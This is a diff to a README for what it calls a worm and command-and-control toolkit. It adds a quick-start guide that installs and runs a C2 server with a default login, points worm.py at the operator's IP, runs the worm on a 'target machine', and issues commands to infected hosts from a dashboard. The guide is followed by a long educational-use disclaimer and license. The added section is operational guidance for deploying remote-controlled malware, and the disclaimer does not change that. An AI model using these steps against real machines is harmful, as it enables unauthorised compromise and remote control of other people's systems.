@@ -4,6 +4,8 @@
 
 ## Table of Contents
 
+- [Quick Start Guide](#quick-start-guide)
+- [Features](#features)
 - [Overview](#overview)
 - [Features](#features)
 - [System Architecture](#system-architecture)
@@ -34,6 +36,130 @@
 - [License](#license)
 - [Quick Reference](#quick-reference)
 ---
+# Quick Start Guide
+
+## For the Impatient
+
+### 1. Start the C2 Server (Your Machine)
+
+```bash
+# Install dependencies
+pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3
+
+# Run the server
+python c2_server.py
+
+# Access dashboard at http://localhost:5000
+# Login: admin / secure_password_123
+```
+
+### 2. Deploy the Worm (Target Machine)
+
+```bash
+# Edit worm.py and set C2_SERVER to your IP
+C2_SERVER = '192.168.1.100'  # Your machine's IP
+
+# Run the worm
+python3 worm.py
+```
+
+### 3. Send Commands
+
+1. Open your browser to `http://localhost:5000`
+2. Click on a connected host.
+3. Select a command from the dropdown menu.
+4. Click **Send Command**.
+
+The client will automatically connect and execute the selected commands.
+
+---
+
+# Legal Disclaimer and License
+
+> **IMPORTANT LEGAL NOTICE**
+>
+> **THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY.**
+
+By downloading, installing, or using this software, you agree to the following terms:
+
+## 1. Authorized Use Only
+
+- This software may **ONLY** be used on systems you own or have explicit written permission to test.
+- Unauthorized use of this software is illegal and may violate computer fraud and abuse laws.
+- The author assumes no responsibility for any misuse or damage caused by this software.
+
+## 2. Educational Purpose
+
+This software is designed to demonstrate malware techniques for cybersecurity education.
+
+It should only be used in controlled environments such as:
+
+- Personal virtual machines
+- Authorized penetration testing
+- Cybersecurity training labs
+- Academic research
+
+## 3. No Warranty
+
+- This software is provided **"AS IS"** without warranty of any kind.
+- The author makes no guarantees regarding functionality or safety.
+- Use at your own risk.
+
+## 4. Liability
+
+- The author is not liable for damages, data loss, or legal consequences.
+- Users are solely responsible for their actions and compliance with applicable laws.
+- The author will not provide support for illegal activities.
+
+## 5. Reporting
+
+- If you discover this software being used maliciously, report it to the author.
+- Security researchers are encouraged to study the code to better understand malware techniques.
+
+---
+
+# License
+
+```text
+MIT License with Ethical Use Clause
+
+Copyright (c) 2024
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software for EDUCATIONAL AND RESEARCH PURPOSES ONLY, subject to the
+following conditions:
+
+1. The above copyright notice and this permission notice shall be included in
+   all copies or substantial portions of the Software.
+
+2. ETHICAL USE CLAUSE: This Software shall NOT be used for:
+   a) Any illegal activities
+   b) Unauthorized access to computer systems
+   c) Malicious purposes of any kind
+   d) Commercial exploitation without prior written consent
+   e) Any activity that violates local, national, or international laws
+
+3. The Software is provided "AS IS", without warranty of any kind, express or
+   implied, including but not limited to the warranties of merchantability,
+   fitness for a particular purpose, and noninfringement. In no event shall the
+   authors or copyright holders be liable for any claim, damages, or other
+   liability, whether in an action of contract, tort, or otherwise, arising
+   from, out of, or in connection with the Software or the use or other
+   dealings in the Software.
+
+4. Any use of this Software that violates any laws or ethical guidelines
+   automatically terminates this license and all permissions granted herein.
+
+5. Users must take full responsibility for ensuring their use of this Software
+   complies with all applicable laws and regulations in their jurisdiction.
+
+THE SOFTWARE IS PROVIDED FOR EDUCATIONAL PURPOSES ONLY. THE AUTHORS DO NOT
+CONDONE OR SUPPORT ANY ILLEGAL OR MALICIOUS USE OF THIS SOFTWARE.
+```
+
+By using this software, you acknowledge that you have read, understood, and agree to these terms.
+
 
 ## Overview
 
